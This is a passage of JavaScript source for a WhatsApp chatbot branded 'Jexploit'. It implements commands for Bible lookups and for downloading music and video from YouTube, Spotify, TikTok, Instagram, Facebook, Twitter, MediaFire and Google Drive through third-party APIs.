            await conn.sendMessage(m.chat, { text: "Error fetching Surah. Try again later." });
            console.error("Quran command error:", err.message);
        }
}
break
case 'bible': {
const BASE_URL = "https://bible-api.com";

    try {
      let chapterInput = text.split(" ").join("").trim();
      if (!chapterInput) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      chapterInput = encodeURIComponent(chapterInput);
      let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
      if (!chapterRes.ok) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      
      let chapterData = await chapterRes.json();
      let bibleChapter = `
*The Holy Bible*\n
*Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
*Chapter Content:*\n
${chapterData.text}\n`;
      
      reply(bibleChapter);
    } catch (error) {
      reply(mess.error);
    }
}
break
case "biblelist": {
try {
        // Liste des livres de la Bible
        const bibleList = `
📜 *Old Testament*:
1. Genesis
2. Exodus
3. Leviticus
4. Numbers
5. Deuteronomy
6. Joshua
7. Judges
8. Ruth
9. 1 Samuel
10. 2 Samuel
11. 1 Kings
12. 2 Kings
13. 1 Chronicles
14. 2 Chronicles
15. Ezra
16. Nehemiah
17. Esther
18. Job
19. Psalms
20. Proverbs
21. Ecclesiastes
22. Song of Solomon
23. Isaiah
24. Jeremiah
25. Lamentations
26. Ezekiel
27. Daniel
28. Hosea
29. Joel
30. Amos
31. Obadiah
32. Jonah
33. Micah
34. Nahum
35. Habakkuk
36. Zephaniah
37. Haggai
38. Zechariah
39. Malachi

📖 *New Testament*:
1. Matthew
2. Mark
3. Luke
4. John
5. Acts
6. Romans
7. 1 Corinthians
8. 2 Corinthians
9. Galatians
10. Ephesians
11. Philippians
12. Colossians
13. 1 Thessalonians
14. 2 Thessalonians
15. 1 Timothy
16. 2 Timothy
17. Titus
18. Philemon
19. Hebrews
20. James
21. 1 Peter
22. 2 Peter
23. 1 John
24. 2 John
25. 3 John
26. Jude
27. Revelation


💢 ${global.botname} 💢
`;

        // Remplacer ce lien par l'URL de l'image que tu m'enverras
        const imageUrl = "https://files.catbox.moe/ptpl5c.jpeg"; // Remplace "TON_LIEN_IMAGE_ICI" par ton lien d'image

        // Vérifier si le message de la commande est correctement reçu
        if (!m.chat) {
            return reply("❌ *An error occurred: Invalid chat.*");
        }

        // Envoi de la réponse avec l'image et la liste des livres de la Bible
        await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `📖 *BIBLE LIST Jexploit*:\n\n` +
                     `Here is the complete list of books in the Bible:\n\n` +
                     bibleList.trim() // Ajout du texte des livres de la Bible
        }, { quoted: mek });
    } catch (error) {
        console.error(error);
        reply(mess.error);
    }
}
break
case 'play3':
case 'xplay': {
    if (!text) return reply(`Example: ${prefix}${command} Winnie Nwagi Malaika`);

    try {
        await reply(`Searching for "${text}"...`);

        const searchResult = await yts(text);
        if (!searchResult?.videos?.length) {
            return reply(`No results found for "${text}"`);
        }

        const video = searchResult.videos[0];
        const videoUrl = video.url;

        const apiUrl = `https://api.princetechn.com/api/download/ytmp3?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
        const response = await axios.get(apiUrl, { timeout: 30000 });

        if (!response.data?.success || !response.data?.result?.download_url) {
            return reply(`Failed to download audio for "${text}"`);
        }

        const { title, download_url, duration, quality } = response.data.result;

        await conn.sendMessage(m.chat, {
            audio: { url: download_url },
            mimetype: 'audio/mpeg',
            fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
            caption: `🎵 ${title}\n⏱ ${duration} | 🎚 ${quality}`
        }, { quoted: m });

    } catch (error) {
        console.error('Song error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case 'play2': {
    await playCommand(conn, m.chat, m, args);
    
}
break
case "ringtone": {
    try {
        const query = args.join(" ");
        if (!query) {
            return reply("Please provide a search query! Example: .ringtone Suna");
        }

        await reply(`🔍 *Searching for "${query}" ringtones...*`);

        // First Priority: Discard API
        const searchUrl = `https://discardapi.dpdns.org/api/dl/ringtone?apikey=guru&title=${encodeURIComponent(query)}`;
        const response = await axios.get(searchUrl, { timeout: 30000 });
        
        if (response.data?.result && response.data.result.length > 0) {
            const ringtones = response.data.result;
            const randomRingtone = ringtones[Math.floor(Math.random() * ringtones.length)];
            
            await conn.sendMessage(
                from,
                {
                    audio: { url: randomRingtone.url || randomRingtone.dl_link },
                    mimetype: "audio/mpeg",
                    fileName: `${randomRingtone.title || query}.mp3`,
                },
                { quoted: m }
            );
            return;
        }
        
        // Fallback: Dark Yasiya API
        const { data } = await axios.get(`https://www.dark-yasiya-api.site/download/ringtone?text=${encodeURIComponent(query)}`, { timeout: 15000 });

        if (!data.status || !data.result || data.result.length === 0) {
            return reply("No ringtones found for your query. Please try a different keyword.");
        }

        const randomRingtone = data.result[Math.floor(Math.random() * data.result.length)];

        await conn.sendMessage(
            from,
            {
                audio: { url: randomRingtone.dl_link },
                mimetype: "audio/mpeg",
                fileName: `${randomRingtone.title}.mp3`,
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error("Error in ringtone command:", error);
        reply("❌ *Error fetching ringtone.*\nPlease try again later.");
    }
    
}
break
case "playdoc": {
if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        document: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('playdoc command failed:', error);
      reply(mess.error);
    }
}
break;
case "play": {
    await playCommand2(conn, m.chat, m, args, buttonHandler);
    break;
}
case "song2": {
  const query = args.join(" ");
        if (!query) return reply(`Example: ${prefix}play3 Faded`);

        try {
            await reply(`Searching for "${query}"...`);
            const apiUrl = `https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(query)}`;
            const response = await axios.get(apiUrl);
            
            if (response.data?.status && response.data?.result) {
                const { title, duration, views, published, download_url } = response.data.result;
                
                if (!download_url) {
                    return reply(`No audio found for "${query}"`);
                }
                
                const caption = `*${title}*\n⏱ ${duration} | 👁 ${views?.toLocaleString()} | 📅 ${published}`;
                
                await conn.sendMessage(m.chat, {
                    audio: { url: download_url },
                    mimetype: 'audio/mpeg',
                    fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
                    ptt: false,
                    caption: caption
                }, { quoted: m });
                
            } else {
                reply(`No results found for "${query}"`);
            }
        } catch (error) {
            console.error('Play3 error:', error.message);
            reply(`Error: ${error.message}`);
        }
}
break 
case "spotify": {
    if (!text) return reply("🎵 *SPOTIFY DOWNLOADER*\n\nExample: .spotify Sekkle down by Beenie Gunter");

    await reply("🔍 *Searching for the song on Spotify...*");
    await conn.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });

    try {
        // Step 1: Search song on Spotify using the new API
        const searchRes = await axios.get(`https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
        const searchData = searchRes.data;

        if (!searchData.status || !searchData.result) {
            return reply("🚫 *Song not found on Spotify.*\n\nPlease check the song name and try again.");
        }

        const result = searchData.result;
        const title = result.title;
        const artist = result.artist;
        const duration = result.duration;
        const thumbnail = result.thumbnail;
        const downloadUrl = result.download_url;

        // Send song info with thumbnail
        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎵 *${title}*\n👤 *Artist:* ${artist}\n⏱️ *Duration:* ${duration}\n\n📥 *Choose download option:*`
        }, { quoted: m });

        // Use buttonHandler for format selection
        if (buttonHandler && typeof buttonHandler.send === 'function') {
            await buttonHandler.send(m.chat, {
                title: '🎵 SPOTIFY DOWNLOAD',
                text: `*${title}*\n\nChoose your preferred format:`,
                footer: 'Powered by Jexploit',
                buttons: [
                    { text: '🎧 Audio (Play)', id: `spotify_audio_${Date.now()}` },
                    { text: '📄 Audio (Document)', id: `spotify_doc_${Date.now()}` },
                    { text: '🎤 Voice Note', id: `spotify_ptt_${Date.now()}` }
                ]
            }, m, async (msg, selectedId) => {
                // Download audio
                const audioRes = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
                const audioBuffer = Buffer.from(audioRes.data);
                
                if (selectedId.includes('audio')) {
                    await conn.sendMessage(m.chat, {
                        audio: audioBuffer,
                        mimetype: 'audio/mpeg',
                        fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp3`,
                        ptt: false
                    }, { quoted: msg });
                } else if (selectedId.includes('doc')) {
                    await conn.sendMessage(m.chat, {
                        document: audioBuffer,
                        mimetype: 'audio/mpeg',
                        fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp3`,
                        caption: `🎵 *${title}*\n👤 ${artist}`
                    }, { quoted: msg });
                } else if (selectedId.includes('ptt')) {
                    await conn.sendMessage(m.chat, {
                        audio: audioBuffer,
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, { quoted: msg });
                }
                await conn.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });
            });
        } else {
            // Fallback: send directly as audio
            const audioRes = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
            const audioBuffer = Buffer.from(audioRes.data);
            
            await conn.sendMessage(m.chat, {
                audio: audioBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp3`,
                ptt: false,
                caption: `🎵 *${title}*\n👤 *${artist}*\n⏱️ *${duration}*\n\n✅ *Downloaded successfully!*`
            }, { quoted: m });
        }

        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error('Spotify error:', error);
        reply("❌ *Error downloading song.*\n\nPlease try again later.");
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
    
}
break
case 'ytmp4': {
if (!text) return reply('.ytmp4 <YouTube URL>');
        
        try {
            await reply('⏳ Downloading video...');
            
            const apiUrl = `https://apiskeith.top/download/mp4?url=${encodeURIComponent(text)}`;
            const res = await axios.get(apiUrl);
            const data = res.data;
            
            if (data.status && data.result) {
                await conn.sendMessage(m.chat, {
                    video: { url: data.result },
                    caption: `📹 *YouTube Video*\n\n${global.wm || ''}`
                }, { quoted: m });
            } else {
                reply('Failed to download video');
            }
            
        } catch (error) {
            console.error('ytmp4 error:', error);
            reply('Error: ' + error.message);
        }
}
break
case 'video2': {
    if (!text) return reply(`Example: ${prefix}video Born to win by fikfamaic`);

    try {
        const { videos } = await yts(text);
        if (!videos || videos.length === 0) {
            return reply(`No results found for "${text}"`);
        }

        const video = videos[0];
        const videoUrl = video.url;

        await reply(`Downloading: ${video.title}`);

        // Use different API that returns direct download
        const apiUrl = `https://apiskeith.top/download/mp4?url=${encodeURIComponent(videoUrl)}`;
        const response = await axios.get(apiUrl);
        
        if (!response.data?.status || !response.data?.result) {
            return reply(`Failed to fetch video. Try again.`);
        }

        const videoDownloadUrl = response.data.result;
        
        // Download the video to buffer first
        const videoBuffer = await axios({
            method: 'GET',
            url: videoDownloadUrl,
            responseType: 'arraybuffer',
            timeout: 60000
        });

        await conn.sendMessage(m.chat, {
            video: Buffer.from(videoBuffer.data),
            mimetype: 'video/mp4',
            caption: `${video.title}`
        }, { quoted: m });

    } catch (error) {
        console.error('Video error:', error);
        reply(`Error: ${error.message}`);
    }
   
}
break
case "video": {
    if (!text) return reply('*Please provide a song name or YouTube URL!*');

    try {
        let videoUrl = text;
        let videoData;
        let videoTitle = "";
        let videoThumbnail = "";

        // Check if input is a YouTube URL or search term
        if (text.includes('youtube.com/watch?v=') || text.includes('youtu.be/')) {
            // Direct YouTube URL - try to get metadata
            videoData = await fetchVideoDownloadUrl(text);
            videoUrl = text;
        } else {
            // Search for video
            const search = await yts(text);
            if (!search || search.all.length === 0) return reply('*No videos found for your query.*');

            const video = search.all[0];
            videoUrl = video.url;
            videoTitle = video.title;
            videoThumbnail = video.thumbnail;
            videoData = await fetchVideoDownloadUrl(videoUrl);
        }

        const downloadUrl = videoData.downloadUrl;
        const metadata = videoData.metadata;
        
        // Use metadata from API or from yts search
        const finalTitle = metadata?.title || videoTitle || 'Your video';
        const finalThumbnail = metadata?.thumbnail || videoThumbnail;
        const channel = metadata?.channel || 'YouTube';
        const duration = metadata?.duration || 'N/A';
        const views = metadata?.views || 'N/A';

        // Send video info with thumbnail
        if (finalThumbnail) {
            await conn.sendMessage(m.chat, {
                image: { url: finalThumbnail },
                caption: `🎥 *${finalTitle}*\n📺 *Channel:* ${channel}\n⏱️ *Duration:* ${duration}\n👁️ *Views:* ${views}\n\n📥 *Choose download option below:*`
            }, { quoted: m });
        } else {
            await conn.sendMessage(m.chat, {
                text: `🎥 *${finalTitle}*\n📺 *Channel:* ${channel}\n⏱️ *Duration:* ${duration}\n👁️ *Views:* ${views}\n\n📥 *Choose download option below:*`
            }, { quoted: m });
        }

        // Send buttons ONLY - no automatic download
        if (buttonHandler && typeof buttonHandler.send === 'function') {
            await buttonHandler.send(m.chat, {
                title: '🎥 VIDEO DOWNLOAD',
                text: `*${finalTitle.substring(0, 50)}*\n\nTap button to download video:`,
                footer: 'Powered by Jexploit',
                buttons: [
                    { text: '📹 Download Video', id: `video_dl_${Date.now()}` },
                    { text: '▶️ Watch on YouTube', url: videoUrl }
                ]
            }, m, async (msg, selectedId) => {
                if (selectedId.includes('video_dl')) {
                    await conn.sendMessage(m.chat, {
                        video: { url: downloadUrl },
                        mimetype: 'video/mp4',
                        fileName: `${finalTitle.replace(/[^\w\s]/gi, '')}.mp4`,
                        caption: `✅ *Video ready!*\n\n🎥 *${finalTitle}*`
                    }, { quoted: msg });
                    await conn.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });
                }
            });
        } else {
            // Fallback: send button-less message
            await conn.sendMessage(m.chat, {
                text: `📹 *Download Video:* ${downloadUrl}\n\n▶️ *Watch on YouTube:* ${videoUrl}`
            }, { quoted: m });
        }

    } catch (error) {
        console.error('Video command failed:', error);
        reply(`❌ *Error fetching video.*\nPlease try again later.`);
    }
    
}
break;
case 'checkapikey': {
    const args = body.trim().split(/\s+/);
    args.shift();
    const apiKey = args.join(' ');
    
    if (!apiKey) {
        return reply("Please provide an API key to check.\n\nExample: !checkapikey prince");
    }
    
    try {
        const apiUrl = `https://api.princetechn.com/checkapikey?apikey=${encodeURIComponent(apiKey)}`;
        const { data } = await axios.get(apiUrl, { timeout: 10000 });
        
        if (data && data.success && data.result) {
            const result = data.result;
            const resultText = `API Key Status\n\nKey: ${result.apikey}\nUsername: ${result.username}\nPlan: ${result.plan}\nLimit: ${result.limit}\nUsed: ${result.used}\nRemaining: ${result.remainingLimit}\nRegistered: ${result.registeredDate}\nExpiry: ${result.expiryDate}\n\n${result.customMessage}`;
            reply(resultText);
        } else {
            reply("Failed to check API key status. Please make sure your API key is valid.");
        }
    } catch (error) {
        console.error('CheckAPI error:', error.message);
        reply("Error checking API key. Please try again later!");
    }
    
}
break
case "ytstalk": {
try {
    if (!q) {
      return reply("❌ Please provide a valid YouTube channel username or ID.");
    }

    await conn.sendMessage(from, {
      react: { text: "⏳", key: m.key }
    });

    const apiUrl = `https://delirius-apiofc.vercel.app/tools/ytstalk?channel=${encodeURIComponent(q)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.status || !data.data) {
      return reply("⚠️ Failed to fetch YouTube channel details. Ensure the username or ID is correct.");
    }

    const yt = data.data;
    const caption = `╭━━━〔 *YOUTUBE STALKER* 〕━━━⊷\n`
      + `┃👤 *Username:* ${yt.username}\n`
      + `┃📊 *Subscribers:* ${yt.subscriber_count}\n`
      + `┃🎥 *Videos:* ${yt.video_count}\n`
      + `┃🔗 *Channel Link:* (${yt.channel})\n`
      + `╰━━━⪼\n\n`
      + `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit`;

    await conn.sendMessage(from, {
      image: { url: yt.avatar },
      caption: caption
    }, { quoted: m });

  } catch (error) {
    console.error("Error:", error);
    reply(mess.error);
  }
}
break
case "download": {
if (!text) return reply('Enter download URL');
    
    try {
      let res = await fetch(text, { method: 'GET', redirect: 'follow' });
      let contentType = res.headers.get('content-type');
      let buffer = await res.buffer();
      let extension = contentType.split('/')[1]; 
      let filename = res.headers.get('content-disposition')?.match(/filename="(.*)"/)?.[1] || `download-${Math.random().toString(36).slice(2, 10)}.${extension}`;

      let mimeType;
      switch (contentType) {
        case 'audio/mpeg':
          mimeType = 'audio/mpeg';
          break;
        case 'image/png':
          mimeType = 'image/png';
          break;
        case 'image/jpeg':
          mimeType = 'image/jpeg';
          break;
        case 'application/pdf':
          mimeType = 'application/pdf';
          break;
        case 'application/zip':
          mimeType = 'application/zip';
          break;
        case 'video/mp4':
          mimeType = 'video/mp4';
          break;
        case 'video/webm':
          mimeType = 'video/webm';
          break;
        case 'application/vnd.android.package-archive':
          mimeType = 'application/vnd.android.package-archive';
          break;
        default:
          mimeType = 'application/octet-stream';
      }

      conn.sendMessage(m.chat, { document: buffer, mimetype: mimeType, fileName: filename }, { quoted: m });
    } catch (error) {
      reply(`Error downloading file: ${error.message}`);
    }
}
break
case "gdrive": {
if (!text) return reply("*Please provide a Google Drive file URL*");

    try {
      let response = await fetch(`${global.siputzx}/api/d/gdrive?url=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.status || !data.data) {
        return reply("*Please try again later or try another command!*");
      } else {
        const downloadUrl = data.data.download;
        const filePath = path.join(__dirname, `${data.data.name}`);

        const writer = fs.createWriteStream(filePath);
        const fileResponse = await axios({
          url: downloadUrl,
          method: 'GET',
          responseType: 'stream'
        });

        fileResponse.data.pipe(writer);

        writer.on('finish', async () => {
          await conn.sendMessage(m.chat, {
            document: { url: filePath },
            fileName: data.data.name,
            mimetype: fileResponse.headers['content-type']
          });

          fs.unlinkSync(filePath);
        });

        writer.on('error', (err) => {
          console.error('Error downloading the file:', err);
          reply("An error occurred while downloading the file.");
        });
      }
    } catch (error) {
      console.error('Error fetching Google Drive file details:', error);
      reply(mess.error);
    }
}
break
case "image":
case "img":
case "pinterest": {
if (!text) return reply("*Please provide a search query*");

    try {
      let response = await fetch(`https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.result || data.result.length === 0) {
        return reply("*No images found or API error. Please try again later or try another query!*");
      } else {
        const images = data.result.slice(0, 5);

        for (const imageUrl of images) {
          await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `Search: ${text}`,
          });
          await new Promise(resolve => setTimeout(resolve, 500)); 
        }
      }
    } catch (error) {
      console.error('Error fetching images:', error);
      reply(mess.error);
    }
}
break
case 'instagram':
case 'ig':
case 'igdl': {
    const url = args[0];
    if (!url) return reply(`*Please provide Instagram url!*`);

    try {
        await reply(`Fetching video...`);

        const apiUrl = `https://apis.davidcyril.name.ng/instagram?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl);

        if (!response.data?.success || !response.data?.result?.video) {
            return reply(`Failed to fetch Instagram video.`);
        }

        const videoUrl = response.data.result.video;

        await conn.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `> ${global.wm}`
        }, { quoted: m });

    } catch (error) {
        console.error('Instagram error:', error.message);
        reply(`Error: ${error.message}`);
    }
   
}
break
case 'gitclone': {
if (!text) return reply("*Please provide gitHub repository link*")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("*Invalid link*")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`*Error! Repository Not Found*`)
}}
break
case 'mf':
case 'mediafire': {
    const url = args[0];
    if (!url) return reply(`*Please provide mediafire url!*`);

    try {
        const apiUrl = `https://apis.davidcyril.name.ng/mediafire?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl);

        if (!response.data?.downloadLink) {
            return reply(`Failed to fetch file.`);
        }

        const { fileName, downloadLink, size } = response.data;

        await conn.sendMessage(m.chat, {
            document: { url: downloadLink },
            fileName: fileName,
            mimetype: 'application/octet-stream',
            caption: `📁 ${fileName}\n📦 Size: ${size}`
        }, { quoted: m });

    } catch (error) {
        console.error('MediaFire error:', error.message);
        reply(`Error: ${error.message}`);
    }
   
}
break
case "itunes": {
if (!text) return reply("*Please provide a song name*");
    
    try {
      let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`);
      if (!res.ok) {
        throw new Error(`*API request failed with status ${res.status}*`);
      }
      let json = await res.json();
      let songInfo = `*Song Information:*\n
 • *Name:* ${json.name}\n
 • *Artist:* ${json.artist}\n
 • *Album:* ${json.album}\n
 • *Release Date:* ${json.release_date}\n
 • *Price:* ${json.price}\n
 • *Length:* ${json.length}\n
 • *Genre:* ${json.genre}\n
 • *URL:* ${json.url}`;
     
      if (json.thumbnail) {
        await conn.sendMessage(
          m.chat,
          { image: { url: json.thumbnail }, caption: songInfo },
          { quoted: m }
        );
      } else {
        reply(songInfo);
      }
    } catch (error) {
      console.error(error);
      reply(mess.error);
    }
}
break;
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
reply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await conn.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
conn.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break       
case 'fb':
case 'facebook': {
    if (!text) return reply('*Please provide a Facebook URL*');
        
        await reply('📥 Downloading...');
        
        try {
            // Use siputzx API
            let res = await fetch(`https://api.siputzx.my.id/api/d/facebook?url=${encodeURIComponent(text)}`);
            let data = await res.json();
            
            // Check if API returned success
            if (!data.status || !data.data) {
                return reply('Failed to fetch video. Check the URL and try again.');
            }
            
            const videoData = data.data;
            const downloads = videoData.downloads || [];
            
            let videoUrl = null;
            
            // Try to get HD (720p)
            const hdVideo = downloads.find(d => d.quality === '720p (HD)' && d.type === 'video');
            if (hdVideo) {
                videoUrl = hdVideo.url;
            } else {
                // Fallback to SD (360p)
                const sdVideo = downloads.find(d => d.quality === '360p (SD)' && d.type === 'video');
                if (sdVideo) {
                    videoUrl = sdVideo.url;
                }
            }
            
            if (!videoUrl) return reply('No video download link found');
            
            await conn.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: `${global.wm || ''}`,
                contextInfo: { 
                    externalAdReply: { 
                        title: "Facebook Video",
                        body: "Downloaded",
                        thumbnailUrl: videoData.thumbnail || '',
                        sourceUrl: text,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    } 
                }
            }, { quoted: m });
            
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            
        } catch (error) {
            console.error('Facebook error:', error);
            reply(`❌ Error: ${error.message}`);
            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        }
}
break
case 'capcut':
case 'cc':
case 'capcutdl':
    if (!text) return reply("*Please provide a CapCut template URL.*`");
    
    try {
        await reply("📥 Downloading CapCut template...");
        
        const response = await fetch(`${global.mess.siputzx}/api/d/capcut?url=${encodeURIComponent(text)}`);
        const data = await response.json();
        
        if (!data.status || !data.data || !data.data.originalVideoUrl) {
            return reply("*Failed to download CapCut template. Check the URL*.");
        }
        
        const { title, originalVideoUrl, authorName } = data.data;
        
        await conn.sendMessage(m.chat, {
            video: { url: originalVideoUrl },
            caption: `📹 *CapCut Template*\n📝 ${title || 'No title'}\n👤 By: ${authorName || 'Unknown'}\n\n> ${global.wm || ''}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { 
            react: { text: "✅", key: m.key } 
        });
        
    } catch (error) {
        console.error('CapCut download error:', error);
        reply("*Error downloading CapCut template. Try again later.*");
        await conn.sendMessage(m.chat, { 
            react: { text: "❌", key: m.key } 
        });
  }
  
break
case 'twitter':
case 'x': {
    if (!text) return reply(`*Please provide Twitter link or url!*`);

    try {
        // React while processing
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // API URL
        const apiUrl = `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`;
        
        // Fetch response
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (data.status && data.data && data.data.downloadLink) {
            // Send video
            await conn.sendMessage(
                m.chat,
                {
                    video: { url: data.data.downloadLink },
                    mimetype: 'video/mp4',
                    caption: `*${data.data.videoTitle || 'Twitter Video'}*\n\n${global.wm || ''}`
                },
                { quoted: m }
            );
            
            // Success reaction
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            throw new Error('No video found');
        }
        
    } catch (error) {
        console.error('Twitter command error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(mess.error);
    }
}
break
case 'tiktok':
case 'tt': {
    if (!text) return reply(conn, `Use: ${prefix + command} <tiktok_link>`, m)
    
    await reply(`Please wait ${global.botname} 💪 its fetching you video...`)
    
    
    try {
        let data = await fg.tiktok(text)
        let json = data.result
        let caption = `[ TIKTOK DOWNLOAD ]\n\n`
        caption += `◦ *ID*: ${json.id}\n`
        caption += `◦ *Username*: ${json.author?.nickname || 'N/A'}\n`
        caption += `◦ *Title*: ${json.title || 'No title'}\n`
        caption += `◦ *Likes*: ${json.digg_count || 0}\n`
        caption += `◦ *Comments*: ${json.comment_count || 0}\n`
        caption += `◦ *Shares*: ${json.share_count || 0}\n`
        caption += `◦ *Plays*: ${json.play_count || 0}\n`
        caption += `◦ *Created*: ${json.create_time || 'Unknown'}\n`
        caption += `◦ *Size*: ${json.size || 'Unknown'}\n`
        caption += `◦ *Duration*: ${json.duration || 'Unknown'} seconds`
        
        if (json.images) {
            // Handle image slideshow
            for (let imageUrl of json.images) {
                await conn.sendMessage(m.chat, { 
                    image: { url: imageUrl },
                    caption: caption
                }, { quoted: m })
                await sleep(2000) // Delay between images
            }
        } else if (json.play) {
            // Handle video
            await conn.sendMessage(m.chat, { 
                video: { url: json.play }, 
                mimetype: 'video/mp4',
                caption: caption
            }, { quoted: m })
            
            // Send music separately if available
            if (json.music) {
                await sleep(3000)
                await conn.sendMessage(m.chat, { 
                    audio: { url: json.music },
                    mimetype: 'audio/mpeg'
                }, { quoted: m })
            }
        } else {
            await reply(bot, 'Failed to download TikTok content. The link might be invalid or private.', m)
        }
    } catch (error) {
        console.error('TikTok Error:', error)
        await reply(bot, 'Error downloading TikTok content. Please try again later or check the link.', m)
    }
}
break
case "tiktok2": {
if (!args[0]) return reply('*Please provide a TikTok video url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          caption: global.wm,
          video: { url: apiUrl.data.video },
          fileName: "video.mp4",
          mimetype: "video/mp4",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(mess.error);
    }
}
break 
case 'tiktoksearch':
case 'tts': {
    const query = args.join(" "); 
        if (!query) return reply("*Please provide a search term. Example: `.tiktoksearch keizzah4189*`");
    
    try {
      const response = await fetch(`${global.api}/search/tiktoksearch?query=${encodeURIComponent(query)}`);
      const data = await response.json();
      
      if (!data.status || !data.result?.length) {
        return reply(`❌ No TikTok videos found for "${query}"`);
      }
      
      let message = `*TikTok Search Results for "${query}"*\n\n`;
      message += `*📊 Found:* ${data.result.length} videos\n\n`;
      
      data.result.slice(0, 5).forEach((video, i) => {
        message += `*${i + 1}. Video*\n`;
        message += `👤 *Author:* ${video.author?.nickname || 'Unknown'}\n`;
        message += `🌍 *Region:* ${video.region || 'N/A'}\n`;
        message += `⏱️ *Duration:* ${video.duration || 0} seconds\n`;
        if (video.title) message += `📝 *Title:* ${video.title.substring(0, 50)}${video.title.length > 50 ? '...' : ''}\n`;
        message += `🎬 *Watch:* ${video.play}\n`;
        if (video.music) message += `🎵 *Audio:* ${video.music}\n`;
        message += `\n`;
      });
      
      message += `\n_Showing top 5 results. Use .ttdl [video_url] to download._`;
      
      reply(message);
    } catch (error) {
      console.error('TikTok Search Error:', error);
      reply("❌ Error searching TikTok. Try again later.");
    }
}
break
case "tiktokaudio": {
if (!args[0]) return reply('*Please provide a TikTok audio url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          audio: { url: apiUrl.data.audio },
          fileName: "tiktok.mp3",
          mimetype: "audio/mpeg",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case "savestatus":
case  "save": {
await saveStatusMessage(m);
  }
break
case 'apkdl': 
case 'apk': {
    const appName = args.join(' ');
    
